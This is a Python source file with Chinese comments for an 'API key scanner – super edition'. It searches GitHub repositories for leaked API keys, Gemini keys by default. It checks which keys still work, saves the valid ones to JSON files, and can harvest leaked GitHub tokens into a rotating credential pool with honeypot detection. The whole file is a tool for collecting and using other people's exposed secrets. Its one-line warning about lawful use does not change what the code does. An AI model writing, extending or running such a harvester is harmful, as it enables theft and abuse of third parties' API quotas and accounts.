#!/usr/bin/env python3
"""
API密钥扫描器 - 超级版
集成高级凭证管理系统和Token自动收集功能

功能特性：
1. 企业级凭证管理系统
2. 智能负载均衡（8种策略）
3. 自愈机制和健康检查
4. Token自动发现和验证（可选）
5. 实时监控仪表板
6. 加密存储
"""

import os
import sys
import time
import json
import asyncio
import signal
import threading
import argparse
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Set, Tuple
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

# 添加项目根目录到路径
sys.path.insert(0, str(Path(__file__).parent.parent))

# 导入基础模块
from common.config import Config
from common.Logger import Logger
from utils.file_manager import FileManager
from utils.parallel_validator import ParallelValidator

# 导入高级凭证管理系统
from credential_manager.core.manager import get_credential_manager
from credential_manager.core.models import ServiceType, CredentialStatus
from credential_manager.integration.credential_bridge import CredentialBridge
from credential_manager.discovery.token_harvester import get_token_harvester
from credential_manager.monitoring.dashboard import start_monitoring_server

# 导入增强版GitHub客户端
from utils.github_client_enhanced import GitHubClientEnhanced

# 导入通用API扫描器
from api_scanner_universal import UniversalAPIScanner

# 配置日志
logger = Logger.get_logger("api_key_scanner_super")


class SuperAPIKeyScanner:
    """
    超级版API密钥扫描器
    集成所有高级功能
    """
    
    def __init__(self, target_apis: List[str] = None):
        """
        初始化超级扫描器
        
        Args:
            target_apis: 要扫描的API类型列表，默认['gemini']
        """
        logger.info("🚀 初始化超级版API密钥扫描器...")
        
        # 设置目标API类型（默认gemini）
        self.target_apis = target_apis or ['gemini']
        logger.info(f"🎯 扫描目标: {', '.join(self.target_apis)}")
        
        # 加载配置
        self.config = Config()
        
        # 初始化文件管理器
        self.file_manager = FileManager()
        
        # 初始化高级凭证管理系统
        self._init_credential_manager()
        
        # 初始化GitHub客户端（使用增强版）
        self.github_client = GitHubClientEnhanced(self.credential_manager)
        
        # 初始化并行验证器
        self.validator = ParallelValidator()
        
        # 初始化Token收集器（如果启用）
        self._init_token_harvester()
        
        # 初始化通用API扫描器
        self.universal_scanner = UniversalAPIScanner(self.target_apis)
        
        # 统计信息
        self.stats = {
            'start_time': datetime.now(),
            'total_scanned': 0,
            'total_found': 0,
            'total_valid': 0,
            'total_invalid': 0,
            'discovered_tokens': 0,
            'harvested_tokens': 0,
            'errors': 0
        }
        
        # 运行状态
        self.running = True
        self.shutdown_event = threading.Event()
        
        # 注册信号处理
        self._register_signal_handlers()
        
        # 启动监控服务器（如果配置）
        self._start_monitoring()
        
        logger.info("✅ 超级扫描器初始化完成")
    
    def _init_credential_manager(self):
        """初始化凭证管理系统"""
        logger.info("🔧 初始化高级凭证管理系统...")
        
        # 配置凭证管理器
        credential_config = {
            'encryption_enabled': os.getenv('CREDENTIAL_ENCRYPTION_ENABLED', 'true').lower() == 'true',
            'balancing_strategy': os.getenv('CREDENTIAL_BALANCING_STRATEGY', 'quota_aware'),
            'min_pool_size': int(os.getenv('CREDENTIAL_MIN_POOL_SIZE', '10')),
            'max_pool_size': int(os.getenv('CREDENTIAL_MAX_POOL_SIZE', '100')),
            'health_check_interval': int(os.getenv('CREDENTIAL_HEALTH_CHECK_INTERVAL', '60')),
            'discovery_interval': int(os.getenv('CREDENTIAL_DISCOVERY_INTERVAL', '300')),
            'harvesting_enabled': os.getenv('CREDENTIAL_AUTO_HARVEST', 'false').lower() == 'true'
        }
        
        # 初始化管理器
        self.credential_manager = get_credential_manager(credential_config)
        
        # 创建集成桥接器
        self.credential_bridge = CredentialBridge(self.credential_manager)
        
        # 导入现有tokens
        self._import_existing_tokens()
        
        logger.info(f"✅ 凭证管理系统就绪 - 策略: {credential_config['balancing_strategy']}")
    
    def _import_existing_tokens(self):
        """导入现有的GitHub tokens"""
        imported_count = 0
        
        # 从环境变量导入
        env_tokens = os.getenv('GITHUB_TOKENS', '').split(',')
        for token in env_tokens:
            token = token.strip()
            if token and self.credential_manager.add_credential(
                ServiceType.GITHUB, 
                token,
                {'source': 'env', 'imported_at': datetime.now().isoformat()}
            ):
                imported_count += 1
        
        # 从文件导入（如果配置）
        if os.getenv('USE_EXTERNAL_TOKEN_FILE', 'false').lower() == 'true':
            token_file = os.getenv('GITHUB_TOKENS_FILE', 'github_tokens.txt')
            if os.path.exists(token_file):
                with open(token_file, 'r') as f:
                    for line in f:
                        token = line.strip()
                        if token and not token.startswith('#'):
                            if self.credential_manager.add_credential(
                                ServiceType.GITHUB,
                                token,
                                {'source': 'file', 'imported_at': datetime.now().isoformat()}
                            ):
                                imported_count += 1
        
        logger.info(f"📥 导入了 {imported_count} 个GitHub tokens")
    
    def _init_token_harvester(self):
        """初始化Token收集器"""
        if os.getenv('CREDENTIAL_AUTO_HARVEST', 'false').lower() == 'true':
            logger.info("🔍 初始化Token自动收集器...")
            self.token_harvester = get_token_harvester()
            
            if self.token_harvester.enabled:
                logger.info("✅ Token收集器已启用")
                logger.warning("⚠️ 请确保合法合规使用此功能")
            else:
                logger.info("🔒 Token收集器已禁用")
                self.token_harvester = None
        else:
            self.token_harvester = None
    
    def _start_monitoring(self):
        """启动监控服务器"""
        if os.getenv('MONITORING_ENABLED', 'false').lower() == 'true':
            logger.info("📊 启动监控仪表板...")
            monitor_thread = threading.Thread(
                target=start_monitoring_server,
                args=(self.credential_manager,),
                daemon=True
            )
            monitor_thread.start()
            logger.info("✅ 监控仪表板已启动: http://localhost:8080")
    
    def _register_signal_handlers(self):
        """注册信号处理器"""
        def signal_handler(signum, frame):
            logger.info(f"\n⚠️ 收到信号 {signum}，正在优雅关闭...")
            self.shutdown()
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
    
    def shutdown(self):
        """优雅关闭"""
        if not self.running:
            return
        
        self.running = False
        self.shutdown_event.set()
        
        logger.info("💾 保存进度和统计信息...")
        self._save_progress()
        
        # 关闭凭证管理器
        if hasattr(self, 'credential_manager'):
            self.credential_manager.shutdown()
        
        logger.info("👋 扫描器已安全关闭")
    
    def _save_progress(self):
        """保存扫描进度"""
        progress_file = Path("data/scanner_progress.json")
        progress_file.parent.mkdir(parents=True, exist_ok=True)
        
        progress_data = {
            'timestamp': datetime.now().isoformat(),
            'stats': self.stats,
            'credential_status': self.credential_manager.get_status() if hasattr(self, 'credential_manager') else {},
            'harvester_stats': self.token_harvester.get_statistics() if self.token_harvester else {}
        }
        
        with open(progress_file, 'w') as f:
            json.dump(progress_data, f, indent=2)
        
        logger.info(f"✅ 进度已保存到 {progress_file}")
    
    async def scan_repository(self, repo_data: Dict) -> List[Dict]:
        """
        扫描单个仓库
        
        Args:
            repo_data: 仓库信息
            
        Returns:
            发现的密钥列表
        """
        found_keys = []
        repo_name = repo_data.get('full_name', 'unknown')
        
        try:
            # 搜索仓库中的文件
            files = await self.github_client.search_in_repository(
                repo_name,
                "AIzaSy",
                file_extensions=['.json', '.js', '.py', '.env', '.yml', '.yaml']
            )
            
            for file_data in files:
                # 获取文件内容
                content = await self.github_client.get_file_content(
                    repo_name,
                    file_data['path']
                )
                
                if content:
                    # 提取所有类型的API密钥
                    all_keys = self._extract_api_keys(content)
                    
                    for api_type, keys in all_keys.items():
                        for key in keys:
                            key_info = {
                                'key': key,
                                'api_type': api_type,
                                'repository': repo_name,
                                'file_path': file_data['path'],
                                'file_url': file_data.get('html_url', ''),
                                'discovered_at': datetime.now().isoformat()
                            }
                            found_keys.append(key_info)
                    
                    # 如果启用了Token收集器，扫描GitHub tokens
                    if self.token_harvester and self.token_harvester.enabled:
                        discovered_tokens = self.token_harvester.extract_tokens_from_content(
                            content,
                            file_data.get('html_url', '')
                        )
                        
                        if discovered_tokens:
                            self.stats['discovered_tokens'] += len(discovered_tokens)
                            
                            # 异步验证tokens
                            for token in discovered_tokens:
                                if await self.token_harvester.validate_token(token):
                                    self.stats['harvested_tokens'] += 1
            
            self.stats['total_scanned'] += 1
            
        except Exception as e:
            logger.error(f"扫描仓库 {repo_name} 时出错: {e}")
            self.stats['errors'] += 1
        
        return found_keys
    
    def _extract_api_keys(self, content: str) -> Dict[str, List[str]]:
        """
        从内容中提取所有类型的API密钥
        
        Args:
            content: 文件内容
            
        Returns:
            {api_type: [keys]} 字典
        """
        # 使用通用扫描器提取所有类型的密钥
        return self.universal_scanner.extract_all_keys(content)
    
    async def validate_keys(self, keys: List[Dict]) -> Tuple[List[Dict], List[Dict]]:
        """
        批量验证API密钥
        
        Args:
            keys: 待验证的密钥列表
            
        Returns:
            (有效密钥列表, 无效密钥列表)
        """
        valid_keys = []
        invalid_keys = []
        
        # 按API类型分组
        keys_by_type = {}
        for key_info in keys:
            api_type = key_info.get('api_type', 'gemini')
            if api_type not in keys_by_type:
                keys_by_type[api_type] = []
            keys_by_type[api_type].append(key_info)
        
        # 使用通用扫描器验证
        for api_type, type_keys in keys_by_type.items():
            for key_info in type_keys:
                is_valid = self.universal_scanner.validate_key(
                    key_info['key'],
                    api_type
                )
                
                if is_valid:
                    valid_keys.append(key_info)
                    self.stats['total_valid'] += 1
                    logger.info(f"✅ 有效 {api_type} 密钥: {key_info['key'][:10]}... from {key_info['repository']}")
                else:
                    invalid_keys.append(key_info)
                    self.stats['total_invalid'] += 1
        
        return valid_keys, invalid_keys
    
    async def run_scan(self, queries: List[str]):
        """
        运行扫描任务
        
        Args:
            queries: 搜索查询列表
        """
        logger.info(f"🔍 开始扫描 {len(queries)} 个查询...")
        
        all_found_keys = []
        
        for query in queries:
            if not self.running:
                break
            
            logger.info(f"📝 处理查询: {query}")
            
            try:
                # 搜索仓库
                repositories = await self.github_client.search_repositories(
                    query,
                    max_results=100
                )
                
                logger.info(f"📦 找到 {len(repositories)} 个仓库")
                
                # 并发扫描仓库
                scan_tasks = []
                for repo in repositories:
                    if not self.running:
                        break
                    scan_tasks.append(self.scan_repository(repo))
                
                # 等待所有扫描完成
                if scan_tasks:
                    results = await asyncio.gather(*scan_tasks, return_exceptions=True)
                    
                    for result in results:
                        if isinstance(result, list):
                            all_found_keys.extend(result)
                            self.stats['total_found'] += len(result)
                
                # 批量验证发现的密钥
                if all_found_keys:
                    logger.info(f"🔑 验证 {len(all_found_keys)} 个密钥...")
                    valid_keys, invalid_keys = await self.validate_keys(all_found_keys)
                    
                    # 保存有效密钥
                    if valid_keys:
                        self._save_valid_keys(valid_keys)
                
                # 更新凭证状态
                self._update_credential_status()
                
            except Exception as e:
                logger.error(f"处理查询 '{query}' 时出错: {e}")
                self.stats['errors'] += 1
        
        # 显示最终统计
        self._show_statistics()
    
    def _save_valid_keys(self, keys: List[Dict]):
        """保存有效密钥"""
        # 按API类型分组保存
        keys_by_type = {}
        for key_info in keys:
            api_type = key_info.get('api_type', 'gemini')
            if api_type not in keys_by_type:
                keys_by_type[api_type] = []
            keys_by_type[api_type].append(key_info)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        for api_type, type_keys in keys_by_type.items():
            output_file = Path(f"data/keys/{api_type}_valid_keys_{timestamp}.json")
            output_file.parent.mkdir(parents=True, exist_ok=True)
            
            # 读取现有密钥
            existing_keys = []
            base_file = Path(f"data/keys/{api_type}_valid_keys.json")
            if base_file.exists():
                with open(base_file, 'r') as f:
                    existing_keys = json.load(f)
            
            # 合并新密钥
            all_keys = existing_keys + type_keys
            
            # 去重（基于key值）
            unique_keys = {}
            for key_info in all_keys:
                unique_keys[key_info['key']] = key_info
            
            # 保存到基础文件
            with open(base_file, 'w') as f:
                json.dump(list(unique_keys.values()), f, indent=2)
            
            # 也保存带时间戳的备份
            with open(output_file, 'w') as f:
                json.dump(type_keys, f, indent=2)
            
            logger.info(f"💾 保存了 {len(type_keys)} 个新的 {api_type} 有效密钥")
    
    def _update_credential_status(self):
        """更新凭证状态"""
        status = self.credential_manager.get_status()
        
        # 显示凭证池状态
        for service_type, pool_status in status['pools'].items():
            logger.info(
                f"🔑 {service_type} 池状态: "
                f"活跃={pool_status['active_count']}/{pool_status['total_count']}, "
                f"健康度={pool_status['health_score']:.1f}%"
            )
    
    def _show_statistics(self):
        """显示统计信息"""
        duration = datetime.now() - self.stats['start_time']
        
        logger.info("=" * 60)
        logger.info("📊 扫描统计")
        logger.info("=" * 60)
        logger.info(f"⏱️  运行时间: {duration}")
        logger.info(f"📦 扫描仓库: {self.stats['total_scanned']}")
        logger.info(f"🔑 发现密钥: {self.stats['total_found']}")
        logger.info(f"✅ 有效密钥: {self.stats['total_valid']}")
        logger.info(f"❌ 无效密钥: {self.stats['total_invalid']}")
        
        # 显示各API类型的统计
        if hasattr(self, 'universal_scanner'):
            print("\n📊 各API类型统计:")
            for api_type, stats in self.universal_scanner.stats.items():
                if stats['total_found'] > 0:
                    print(f"  {api_type.upper()}:")
                    print(f"    发现: {stats['total_found']}")
                    print(f"    有效: {stats['valid']}")
                    print(f"    无效: {stats['invalid']}")
        
        if self.token_harvester:
            logger.info(f"🔍 发现Tokens: {self.stats['discovered_tokens']}")
            logger.info(f"✨ 收集Tokens: {self.stats['harvested_tokens']}")
        
        logger.info(f"⚠️  错误次数: {self.stats['errors']}")
        
        # 显示凭证管理器统计
        cm_stats = self.credential_manager.stats
        logger.info("=" * 60)
        logger.info("🎯 凭证管理统计")
        logger.info("=" * 60)
        logger.info(f"📥 总请求数: {cm_stats['total_requests']}")
        logger.info(f"✅ 成功请求: {cm_stats['successful_requests']}")
        logger.info(f"❌ 失败请求: {cm_stats['failed_requests']}")
        logger.info(f"🔍 发现凭证: {cm_stats['credentials_discovered']}")
        logger.info(f"✔️  验证凭证: {cm_stats['credentials_validated']}")
        logger.info(f"📁 归档凭证: {cm_stats['credentials_archived']}")
        
        if self.token_harvester:
            harvester_stats = self.token_harvester.get_statistics()
            if harvester_stats['enabled']:
                logger.info("=" * 60)
                logger.info("🔍 Token收集统计")
                logger.info("=" * 60)
                logger.info(f"🔍 总发现: {harvester_stats['stats']['total_discovered']}")
                logger.info(f"✔️  总验证: {harvester_stats['stats']['total_validated']}")
                logger.info(f"➕ 总添加: {harvester_stats['stats']['total_added']}")
                logger.info(f"❌ 总拒绝: {harvester_stats['stats']['total_rejected']}")
                logger.info(f"🍯 蜜罐检测: {harvester_stats['stats']['honeypots_detected']}")
        
        logger.info("=" * 60)


async def main():
    """主函数"""
    print("=" * 60)
    print("🚀 API密钥扫描器 - 超级版")
    print("=" * 60)
    print("功能特性:")
    print("  ✅ 高级凭证管理系统")
    print("  ✅ 智能负载均衡")
    print("  ✅ 自愈机制")
    print("  ✅ Token自动收集（可选）")
    print("  ✅ 实时监控仪表板")
    print("=" * 60)
    
    # 创建扫描器实例
    scanner = SuperAPIKeyScanner()
    
    # 加载查询
    queries_file = Path("queries.txt")
    if not queries_file.exists():
        logger.error("❌ queries.txt 文件不存在")
        return
    
    with open(queries_file, 'r') as f:
        queries = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    if not queries:
        logger.error("❌ 没有找到有效的查询")
        return
    
    logger.info(f"📋 加载了 {len(queries)} 个查询")
    
    try:
        # 运行扫描
        await scanner.run_scan(queries)
    except KeyboardInterrupt:
        logger.info("\n⚠️ 用户中断")
    except Exception as e:
        logger.error(f"❌ 扫描出错: {e}")
    finally:
        scanner.shutdown()


if __name__ == "__main__":
    # 运行主程序
    asyncio.run(main())